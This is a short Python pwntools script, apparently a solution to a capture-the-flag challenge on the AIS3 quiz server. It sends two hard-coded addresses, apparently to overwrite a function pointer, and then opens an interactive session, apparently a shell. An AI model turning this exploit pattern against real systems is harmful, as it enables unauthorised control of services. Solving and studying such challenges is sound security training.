from pwn import *

r = remote('quiz.ais3.org', 10102)
r.recvuntil(': ')
r.sendline(str(0x404028))
r.recvuntil(': ')
r.sendline(str(0x401050))

r.interactive()
